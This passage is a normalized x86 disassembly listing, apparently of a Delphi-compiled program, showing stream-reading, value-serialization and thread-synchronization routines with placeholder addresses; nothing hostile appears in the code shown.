jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_417550
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418540
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410cc0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418540
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410770
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_416bf8
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410cc0
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_417550
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417a94
pop ecx
jmp r-xdata
sub_417ef8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403ecc
jmp r-xdata
mov eax [ ebx ]
call sub_413444
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417f58
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418273
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418340
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418251
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418212
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418364
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_418364
mov eax [ ebp - 0x1c ]
call sub_413018
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418364
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_418364
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_417ef8
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_418364
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403070
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_412d68
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_4181b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405be4
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41375c
xor eax eax
push ebp
push sub_418197
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413914
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41819e
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403128
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4138b8
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_4181e8
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403930
jmp r-xdata
call sub_4038dc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4162ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418258
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418217
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416494
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_4038dc
call sub_403930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418258
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403128
sub_418284
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41832e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418301
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418540
cmp al 0xb
je r-xdata
mov eax ebx
call sub_410644
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_4165dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416614
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418335
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418364
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_418364
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416b04
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403f68
mov eax esi
call j_sub_404344
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416b04
pop edx
pop esi
pop ebx
retn
sub_4183a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41844d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416ae0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41845c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404100
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418454
lea eax [ ebp - 0x8 ]
call sub_404558
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418540
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416b04
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4044c4
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416b04
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416b04
jmp r-xdata
jmp r-xdata
call sub_4165dc
sub_41845c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418533
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416ae0
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4183a0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4046a4
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41853a
lea eax [ ebp - 0xc ]
call sub_403e78
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418540
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416b04
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4047a0
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_416b04
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416b04
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4044c4
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416b04
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405884
jmp r-xdata
jmp r-xdata
call sub_4165dc
sub_418554
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418590
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418364
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418597
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_41859c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41679c
test al al
je r-xdata
mov eax [ ebx ]
call sub_418650
mov eax [ ebx ]
call sub_417708
pop ebx
pop ebp
retn
sub_4185c4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416b04
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418a48
pop ebx
pop ecx
pop ebp
retn
sub_4185f4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41679c
test al al
je r-xdata
mov eax [ ebx ]
call sub_416ae0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_417708
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_418a48
jmp r-xdata
mov eax [ ebx ]
call sub_418650
mov eax [ ebx ]
call sub_41679c
test al al
je r-xdata
mov eax [ ebx ]
call sub_4187ec
mov eax [ ebx ]
call sub_417708
sub_418650
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4187df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418540
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4187e6
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
jmp [ eax * 4 + jump_table_418687 ]
push ebp
call sub_41859c
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_418a48
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_418a48
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418a48
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_418a48
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418364
jmp r-xdata
push ebp
mov eax 0x1
call sub_4185c4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418554
jmp r-xdata
push ebp
mov eax 0x1
call sub_4185c4
pop ecx
jmp r-xdata
push ebp
call sub_4185f4
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418a48
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418a48
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418a48
jmp r-xdata
push ebp
mov eax 0x2
call sub_4185c4
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418a48
jmp r-xdata
push ebp
mov eax 0x1
call sub_4185c4
pop ecx
sub_4187ec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418829
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418364
mov eax ebx
call sub_418650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418830
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_418834
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4188cc
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41679c
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418364
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_418364
jmp r-xdata
mov eax ebx
call sub_4187ec
mov eax ebx
call sub_417708
jmp r-xdata
mov eax ebx
call sub_41679c
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_418834
mov eax ebx
call sub_417708
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4188d3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e9c
retn
sub_4188dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418981
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f10
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_419778
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418988
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
sub_4189ac
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_4189d4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_416a34
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_412f58
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403354
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_416a34
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_418a48
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_416b04
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_416b04
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_418a90
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418c39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_416668
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418c14
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416b04
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415594
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_416b04
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_415f24
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418bef
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_4183a0
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_416b04
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415594
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_416b04
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4102bc
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
lea eax [ ebp - 0x1c ]
call sub_4054b4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40cca4
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418bf6
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_418c58
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418e52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40e818
mov eax [ ebp - 0x4 ]
call sub_416ae0
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
jmp [ eax * 4 + jump_table_418c9a ]
mov eax [ ebp - 0x4 ]
call sub_418540
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417650
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_40faf4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417650
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_40faf4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417650
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_40faf4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417434
mov eax ebx
call sub_40fb84
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417478
mov eax ebx
call sub_40fb84
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4174bc
mov eax ebx
call sub_40fbac
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41750c
mov eax ebx
call sub_40fb98
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4183a0
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40fbc0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41845c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40fbec
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418540
cmp al 0x9
sete dl
mov eax ebx
call sub_40fb5c
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_418a90
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40eb40
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4176bc
push edx
push eax
mov eax ebx
call sub_40fb30
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418e59
lea eax [ ebp - 0x1c ]
call sub_40e82c
lea eax [ ebp - 0xc ]
call sub_404558
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
mov eax ebx
call sub_4103a4
jmp r-xdata
sub_418e60
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_418eac
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_418ed8
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_419048
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418e60
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_419048
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_418e60
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_419048
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_418e60
jmp r-xdata
pop edx
pop ebx
retn
sub_418f5c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404284
je r-xdata
mov eax esi
call sub_404138
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404138
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_419048
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418e60
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_418e60
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_419048
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418e60
mov dl 0x6
mov eax ebx
call sub_419048
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_418e60
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_418e60
sub_418ff4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419039
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405928
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_418f5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419040
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_4190d0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
call sub_4190a8
mov eax ebx
call sub_4190b4
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41925e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41923f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419246
mov eax [ ebp - 0xc ]
call sub_403128
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4138b8
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4137a8
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_419209
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4191da
push [ fs : eax ]
mov [ fs : eax ] esp
